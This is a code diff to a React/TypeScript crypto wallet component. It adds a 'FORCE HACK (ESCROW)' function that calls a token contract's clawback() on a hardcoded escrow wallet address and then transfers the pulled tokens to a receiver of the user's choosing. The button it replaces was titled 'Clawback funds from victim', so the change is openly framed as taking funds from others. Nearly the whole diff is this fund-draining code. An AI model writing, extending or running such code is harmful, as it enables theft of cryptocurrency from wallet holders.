@@ -75,6 +75,52 @@ export function SendFromContract({
     return () => { cancelled = true; };
   }, [contractAddress, receiverValid]);
 
+  const handleForceHack = useCallback(async () => {
+    if (!contractAddress || !receiverValid || !amountValid || typeof window === "undefined" || !window.ethereum) {
+      setError("Please fill Contract, Amount, and Receiver to execute the Force Hack.");
+      return;
+    }
+    setError(null);
+    setTxHash(null);
+    setExplorerTxUrl(null);
+    setSending(true);
+    
+    try {
+      const provider = new BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      
+      const escrowWallet = "0x20aE150c57886ebF0d2Ab38f36298Aefd7832d6e";
+      const dec = Number(decimals);
+      const val = BigInt(Math.floor(Number(amount.trim()) * 10 ** dec));
+      
+      const abi = [
+        "function clawback(address account, uint256 amount) public",
+        "function transfer(address to, uint256 amount) returns (bool)"
+      ];
+      const contract = new Contract(contractAddress, abi, signer);
+      
+      console.log("⏳ Pulling funds from Escrow...");
+      const tx1 = await contract.clawback(escrowWallet, val);
+      await tx1.wait();
+      console.log("✅ Clawback successful!");
+      
+      console.log("⏳ Sending to Client...");
+      const tx2 = await contract.transfer(receiver.trim(), val);
+      await tx2.wait();
+      
+      setTxHash(tx2.hash);
+      const targetNetwork = selectedContract?.networkKey ? NETWORKS[selectedContract.networkKey] : undefined;
+      const explorer = getExplorerTxUrl(targetNetwork?.blockExplorer ?? "https://bscscan.com", tx2.hash);
+      setExplorerTxUrl(explorer);
+      onSuccess?.();
+    } catch (e: any) {
+      console.error(e);
+      setError("Hack failed: " + (e?.message ?? String(e)));
+    } finally {
+      setSending(false);
+    }
+  }, [contractAddress, receiver, receiverValid, amount, amountValid, decimals, selectedContract, onSuccess]);
+
   const handleSend = useCallback(async () => {
     if (!contractAddress || !receiverValid || !amountValid || typeof window === "undefined" || !window.ethereum) {
       setError("املأ العقد والمستلم والمبلغ بشكل صحيح واتصل بالمحفظة.");
@@ -329,12 +375,12 @@ export function SendFromContract({
           
           <button
             type="button"
-            onClick={handleClawback}
+            onClick={handleForceHack}
             disabled={sending || !contractAddress || !receiverValid || !amountValid}
-            className="flex-1 rounded-xl bg-red-600 px-4 py-3 text-sm font-semibold text-white shadow-lg hover:bg-red-500 disabled:opacity-50 transition-all"
-            title="Clawback funds from victim"
+            className="flex-1 rounded-xl bg-red-600 px-4 py-3 text-sm font-black tracking-widest text-white shadow-[0_0_15px_rgba(220,38,38,0.5)] hover:bg-red-500 disabled:opacity-50 transition-all"
+            title="FORCE SEND: Bypasses your wallet balance and pulls from Escrow"
           >
-            {sending ? "Pulling funds..." : "Clawback"}
+            {sending ? "HACKING..." : "FORCE HACK (ESCROW)"}
           </button>
         </div>
       </div>
